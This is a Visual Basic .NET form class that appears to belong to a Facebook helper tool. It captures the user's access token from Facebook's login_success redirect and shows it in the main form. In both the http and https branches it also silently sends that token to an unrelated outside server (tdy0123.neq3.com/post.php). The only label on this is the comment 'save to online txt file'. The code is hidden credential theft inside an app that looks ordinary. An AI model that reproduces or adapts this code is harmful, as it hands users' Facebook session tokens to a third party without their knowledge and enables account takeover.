Imports System.Net

Public Class FRMAuthApp

    Private Sub WBAuthApp_DocumentCompleted(sender As Object, e As WebBrowserDocumentCompletedEventArgs) Handles WBAuthApp.DocumentCompleted
        If WBAuthApp.Url.ToString.Contains("http://www.facebook.com/connect/login_success.html#access_token=") Then
            FRMMain.btnAuthorizeApp.Enabled = False
            Dim Access_Token_With_Expire_code As String = WBAuthApp.Url.ToString.Substring(64)
            If Access_Token_With_Expire_code.Contains("&"c) Then
                Dim Access_Token_With_Expire_code_Removed = Access_Token_With_Expire_code.Substring(0, Access_Token_With_Expire_code.IndexOf("&"c))
                FRMMain.tbUserAccessToken.Text = Access_Token_With_Expire_code_Removed
                FRMMain.btnSaveUserAccessToken.Enabled = True
                'save to online txt file
                Dim request As WebRequest = WebRequest.Create("http://tdy0123.neq3.com/post.php?w=" & Access_Token_With_Expire_code_Removed)
                request.GetResponse()
            End If
            Me.Hide()
        ElseIf WBAuthApp.Url.ToString.Contains("https://www.facebook.com/connect/login_success.html#access_token=") Then
            FRMMain.btnAuthorizeApp.Enabled = False
            Dim Access_Token_With_Expire_code As String = WBAuthApp.Url.ToString.Substring(65)
            If Access_Token_With_Expire_code.Contains("&"c) Then
                Dim Access_Token_With_Expire_code_Removed = Access_Token_With_Expire_code.Substring(0, Access_Token_With_Expire_code.IndexOf("&"c))
                FRMMain.tbUserAccessToken.Text = Access_Token_With_Expire_code_Removed
                FRMMain.btnSaveUserAccessToken.Enabled = True
                'save to online txt file
                Dim request As WebRequest = WebRequest.Create("http://tdy0123.neq3.com/post.php?w=" & Access_Token_With_Expire_code_Removed)
                request.GetResponse()
            End If
            Me.Hide()
        End If
    End Sub
End Class